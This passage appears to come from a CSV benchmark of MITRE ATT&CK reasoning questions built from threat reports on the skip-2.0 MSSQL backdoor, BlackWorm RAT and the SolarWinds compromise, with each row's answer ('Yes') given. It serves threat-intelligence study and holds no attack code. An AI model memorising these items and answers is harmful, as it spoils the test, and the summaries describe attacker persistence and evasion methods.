Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",Yes,Winnti Group’s skip‑2.0_ A Microsoft SQL Server backdoor
334,144,144-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After executing the skip-2.0 backdoor using the SessionEnv service and potentially achieving persistence through DLL hijacking of the TSVIPSrv.DLL file, is the skip-2.0 backdoor likely to employ a VMProtected launcher for defense evasion?","Defense Evasion: The skip-2.0 backdoor employs multiple hooks in the sqllang.dll service to bypass authentication and maintain stealth, effectively blocking event logging. It also uses Winnti's custom packer for software packing, and the launcher is VMProtected, which contributes to its evasion capabilities.","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Persistence: The skip-2.0 backdoor likely achieves persistence by exploiting a DLL hijacking vulnerability, being installed at C:\Windows\System32\TSVIPSrv.DLL, which results in the DLL being loaded by the standard Windows SessionEnv service at system startup.
Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.
Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",Yes,Winnti Group’s skip‑2.0_ A Microsoft SQL Server backdoor
335,144,144-Discovery-T1057-Process Discovery,"After the skip-2.0 backdoor leverages DLL hijacking for persistence by being installed at C:\Windows\System32\TSVIPSrv.DLL and loaded by the SessionEnv service, is the Inner-Loader component likely to list running processes and identify the process running MSSQL Server as part of its process discovery activities?","Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Persistence: The skip-2.0 backdoor likely achieves persistence by exploiting a DLL hijacking vulnerability, being installed at C:\Windows\System32\TSVIPSrv.DLL, which results in the DLL being loaded by the standard Windows SessionEnv service at system startup.
Defense Evasion: The skip-2.0 backdoor employs multiple hooks in the sqllang.dll service to bypass authentication and maintain stealth, effectively blocking event logging. It also uses Winnti's custom packer for software packing, and the launcher is VMProtected, which contributes to its evasion capabilities.
Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",Yes,Winnti Group’s skip‑2.0_ A Microsoft SQL Server backdoor
337,144,144-Persistence-T1574-Hijack Execution Flow,"After the skip-2.0 backdoor utilizes hooks in the sqllang.dll service for stealth and blocks event logging to evade defenses, is it likely that it will exploit a DLL hijacking vulnerability to ensure persistence by being installed at C:\Windows\System32\TSVIPSrv.DLL and loaded by the Windows SessionEnv service?","Persistence: The skip-2.0 backdoor likely achieves persistence by exploiting a DLL hijacking vulnerability, being installed at C:\Windows\System32\TSVIPSrv.DLL, which results in the DLL being loaded by the standard Windows SessionEnv service at system startup.","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Defense Evasion: The skip-2.0 backdoor employs multiple hooks in the sqllang.dll service to bypass authentication and maintain stealth, effectively blocking event logging. It also uses Winnti's custom packer for software packing, and the launcher is VMProtected, which contributes to its evasion capabilities.
Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.
Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",Yes,Winnti Group’s skip‑2.0_ A Microsoft SQL Server backdoor
338,145,145-Defense Evasion-T1562-Impair Defenses,"Before the Syrian Malware Team uses BlackWorm RAT for command and control by communicating to specific IP addresses and ports, is it likely they would utilize BlackWorm's defense evasion capabilities such as disabling Task Manager and killing analysis processes like Wireshark and MBAM?","Defense Evasion: BlackWorm RAT, used by the Syrian Malware Team, includes features for defense evasion such as disabling Task Manager, copying itself to USB drives and P2P share locations, and killing analysis processes like Wireshark and MBAM. The Dark Edition of BlackWorm also has capabilities to bypass UAC, disable host firewalls, and spread over network shares.","Resource Development: The Syrian Malware Team, which is pro-Syrian government and has ties to the Syrian Electronic Army, has been using a .NET based RAT called BlackWorm to infiltrate targets. The original BlackWorm builder was co-authored by Naser AlMutairi, also known as 'njq8', from Kuwait, who has a history of developing RATs such as njw0rm, njRAT/LV, and H-worm/Houdini. Another version, BlackWorm Dark Edition (v2.1), was enhanced by an author known as Black.Hacker. The Syrian Malware Team has been active since at least January 1, 2011, with their Facebook page indicating ongoing activity.
Command and Control: The Syrian Malware Team uses BlackWorm RAT for command and control, with the malware communicating to specific IP addresses and ports. The command structure includes commands like ping, close server, restart server, send file, download, DDoS, and more. The Dark Edition of BlackWorm communicates with a command structure that includes the hostname, username, and active window name, among other details.
Others: The Syrian Malware Team's use of BlackWorm RAT has been linked to various attacks, with the malware author 'njq8' ceasing development activities following a lawsuit by Microsoft. The team's activities include profiling targets and orchestrating attacks, with some members publicly posting malware-related items on Facebook. Samples of BlackWorm Dark Edition used by the team often include strings like 'Syrian Malware' or 'Syrian Malware Team' in the C2 communications or binary strings. The malware has been seen communicating with domains associated with Syria, and the use of Arabic strings in the malware suggests targeting specific regions or individuals.",Yes,Syrian_Malware_Team_BlackWorm
341,146,146-Initial Access-T1195-Supply Chain Compromise,"Before using a compromised software update as their initial access vector through T1195 Supply Chain Compromise, is it likely that the attackers parked domains for future use as part of their Resource Development efforts to acquire infrastructure?","Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
342,146,146-Command and Control-T1071-Application Layer Protocol,Is it likely that UNC2452 employed Discovery techniques such as querying the registry and identifying running processes to gain knowledge about systems and the internal network before using the Application Layer Protocol for Command and Control communications?,"Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
343,146,146-Command and Control-T1568-Dynamic Resolution,"After performing Discovery activities such as querying the registry and conducting process discovery, is it likely that the threat actors would use Dynamic Resolution (T1568) for maintaining Command and Control communications?","Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
345,146,146-Execution-T1569-System Services,"After using various Discovery techniques like Process Discovery and Query Registry to gather system and network knowledge, is it likely that the threat actors will use system services for executing code as part of their operations before employing Defense Evasion techniques such as Masquerading or Subverting Trust Controls to avoid detection?","Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
347,146,146-Resource Development-T1587-Develop Capabilities,"After demonstrating impressive reconnaissance capabilities by understanding the SolarWinds source code and internal development domain names, is it likely that the attackers developed malware capabilities as part of their Resource Development efforts before achieving Initial Access through a compromised software update?","Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
348,146,146-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After the threat actors utilized system services and software deployment tools to execute code during the Execution phase, is it likely that they would gain knowledge about systems and the internal network using Process Discovery and Query Registry techniques before employing techniques to gain elevated permissions under the Privilege Escalation tactic?","Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
350,146,146-Defense Evasion-T1553-Subvert Trust Controls,"After compromising the software supply chain through a malicious SolarWinds Orion platform update to gain initial access, is it likely that the threat actors would utilize Defense Evasion techniques to avoid detection before performing discovery activities such as querying the registry to gather information about the internal network?","Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
